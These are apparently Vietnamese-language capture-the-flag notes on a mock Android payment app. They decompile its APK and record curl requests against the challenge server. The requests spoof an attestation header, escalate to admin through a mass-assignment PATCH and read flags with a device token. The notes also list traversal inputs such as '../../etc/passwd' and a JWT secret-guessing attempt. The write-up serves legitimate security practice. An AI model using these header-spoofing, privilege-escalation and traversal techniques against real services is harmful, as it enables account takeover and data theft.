# notes.md - meridian-pay

Input: `meridian-pay-3.2.1.apk.zip` (12771 B) → `meridian-pay-3.2.1.apk` (16885 B,
sha256 `447c3cd07770cfd78c6601f9076167208e5b670f3708be085cb69d08f741efa1`)
Instance: `https://web-3f25599ac74e8a91.web.h7tex.com`
Định dạng cờ: `H7CTF{uuid}`, một cờ mỗi objective trong 4 objective.

Hết giờ khi đang đào v3, nên hồ sơ này dừng ở 3/4. Cờ nào cũng được re-verify bằng
một lần chạy lại toàn bộ chuỗi trước khi nộp.

---

## Phần đọc APK

cmd: `unzip -o -q meridian-pay-3.2.1.apk.zip && unzip -o -q meridian-pay-3.2.1.apk`
evidence: `AndroidManifest.xml`, `classes.dex` 13776 B, `resources.arsc`, `res/layout/activity_main.xml`,
  `META-INF/`. Không có lib, không có asset đáng kể.
result: OK - bài này chỉ có một file dex để đọc.

cmd: `strings -n 5 classes.dex | grep -iE "^/|api|promo|ftoken|redeem|claim|nonce|hmac|sig|seed|admin|device|profile|account|ledger|internal"`
evidence: `/api/v1/auth/device`, `/api/v1/promo/public`, `/files/`, `device_id`, `deviceId`,
  `seedReceipts`, `val$ftoken`, `Authenticating device...`. Không có chuỗi `H7CTF{`.
result: OK - cờ không nằm trong app, phải đánh vào API.

cmd: androguard `AnalyzeAPK` + dump thân hàm `MainActivity$1`, `MainActivity$4$1`
evidence: `MainActivity$4$1` giữ `val$ftoken`; `Session.setBaseUrl(...)` lấy trực tiếp từ
  `serverField` trên UI; `ExportProvider` và `seedReceipts` ghi file vào `files/`.
  Header `X-Meridian-Client: MeridianPay-Android/3.2.1 (attested)` hardcode trong `ApiClient`.
result: OK - đó là ba chỗ "server tin client".

## H1 - Server tin header tự khai của client
cmd: `curl -X POST $U/api/v1/auth/device -H 'Content-Type: application/json' -d '{"device_id":"probe-1"}'` (không attach header)
evidence: `{"error":"client attestation required"}`
result: DEAD cho request đó, nhưng mở ra hướng: chỉ cần đúng header.

cmd: `curl -X POST $U/api/v1/auth/device -H 'X-Meridian-Client: MeridianPay-Android/3.2.1 (attested)' -d '{"device_id":"probe-1"}'`
evidence: 200, body có khoá `token`; token là JWT `{"alg":"HS256","typ":"JWT"}` /
  `{"sub":"1001","iat":1790412496,"exp":1790498896}`, profile đi kèm là Alicia Reyes, user 1001.
result: OK - bất kỳ device_id nào cũng được cấp bearer của member 1001.

cmd: `curl -H "$A" -H "Authorization: Bearer $TOK" ... /api/v1/internal/promo`
evidence: 200, 180 B, `<html>...Enrollment confirmation:</p><pre>H7CTF{474de245-b63a-4fc0-b9f8-b7dec75e0f27}`
result: OK - đó là cờ v1.

Ghi chú: chạy tiếp `GET /api/v1/promo/public` thì thấy trang này công khai và có sẵn
`<a href="/api/v1/internal/promo">complete enrollment</a>`. Đường vào v1 nằm ngay trong app
của nạn nhân.

## H2 - Mass assignment ở profile
cmd: `PATCH /api/v1/profile` với `{"role":"admin"}`
evidence: 200, profile trả về `"role":"admin"`. Trước đó `GET /api/v1/admin/ledger` trả
  `{"error":"admin role required"}`.
result: OK
cmd sau: `GET /api/v1/admin/ledger`
evidence: 200, 152 B, `{"corporate_master_key_rotation":"H7CTF{fc3b3bd4-7fc2-4679-8150-9d0ce062c50b}","generated":"2026-09-24","note":"admin-only consolidated ledg...`
result: OK - cờ v2. Lệnh PATCH này chạy ở một agent nền; lần chạy chính được ghi lại ở
  bước quét route dưới đây, nơi profile đã cho thấy `"role":"admin"`.

## H3 - Session thiết bị là credential đầy đủ
cmd: `GET /api/v1/accounts/me` với bearer của chính session device
evidence: 200 `{"account":{"balance_cents":418233,"memo":"personal checking","number":"MP-0041-8827","owner":1001,"type":"checking"},"onboarding_memo":"session verified from device - H7CTF{2e58befc-e322-4563-83ae-2f1c00a0277f}","user_id":1001}`
result: OK - cờ v4 nằm nguyên văn trong `onboarding_memo`. Khớp với việc app cất JWT dạng
  plaintext trong SharedPreferences và `ExportProvider` lộ nó qua path traversal
  (`new File(receiptsDir, path.substring(7))`, không lọc `..`).

## Quét mặt đường

cmd: 40 đường dẫn qua `urllib` với bearer + header attested, in ra cái không 404
evidence: chỉ 6 route tồn tại: `/api/v1/auth/device`, `/api/v1/promo/public`,
  `/api/v1/internal/promo`, `/api/v1/accounts/me`, `/api/v1/admin/ledger`, `/api/v1/profile`.
  Toàn bộ `/api/v1/{health,version,config,devices,session,loyalty,rewards,offers,enroll,transfers,
  receipts,users,audit,attest,kyc,statement,secret,internal/{config,flags},flags,webview,...}` là 404.
result: OK - không còn endpoint ẩn nào chưa nhìn.

## Các hướng đã loại cho v3

1. **JWT secret yếu.** `analysis/jwtprobe.py` thử 1144 candidate bằng HMAC so với chữ ký thật.
   evidence: `header: b'{"alg":"HS256","typ":"JWT"}'`, `payload: b'{"sub":"1001","iat":1790412496,"exp":1790498896}'`,
   `[-] secret not found in 1144 candidates`. DEAD.
2. **IDOR qua `device_id`.** `admin`, `0`, `1`, `1000`, `1002`, `MP-0041-8827`, `../../etc/passwd`, `*`.
   evidence: cả tám đều trả `sub=1001 name=Alicia Reyes`. Server không lấy `device_id` làm khoá tra. DEAD.
3. **`tier` là chiều phân quyền thứ hai.** Đặt `platinum`, `merchant`, `vip`, `owner`, `enterprise`,
   `staff`, `internal` rồi đọc lại ba endpoint có cờ.
   evidence: ba endpoint vẫn trả đúng ba cờ cũ, không thêm gì. `PATCH {"tier":"gold"}` chỉ báo
   `updated:["tier"]`. DEAD.
4. **`POST /api/v1/promo/public`** với `{"ftoken":"x"}`. evidence: 405 Method Not Allowed. DEAD.
5. **Route ẩn.** evidence: xem mục quét mặt đường, chỉ 6 route. DEAD.

## Hai lead còn lại cho v3 (chưa làm tới)

1. `MainActivity$2` mở `WebViewActivity` với `baseUrl + /api/v1/promo/public`, và
   `WebViewActivity` tự gắn `Authorization: Bearer` cùng header attested cho mọi URL
   `startsWith(baseUrl)`. `RouterActivity` nhận deep link `?url=` ghi đè `Session.base_url`
   trong SharedPreferences. Chuỗi "client trusts the server" đúng nghĩa là dụ WebView điều
   hướng tới một path khác dưới cùng origin để nó mang theo credential. Chưa thử với
   `Accept` / `Sec-Fetch` giả lập navigation của WebView.
2. `ExportProvider` + `seedReceipts` chỉ seed `receipt-8827.txt` nội dung tĩnh, nên cờ v3 nhiều
   khả năng nằm ở file khác trong `files/` mà traversal với `../` chạm tới được (database,
   shared_prefs). Nghĩa là v3 thuộc phía điện thoại, không phải API.

---

Nguyên tắc ghi: không xoá nhánh sai, chỉ thêm `result: DEAD - <lý do>`, để lần sau đọc lại không thử trùng.
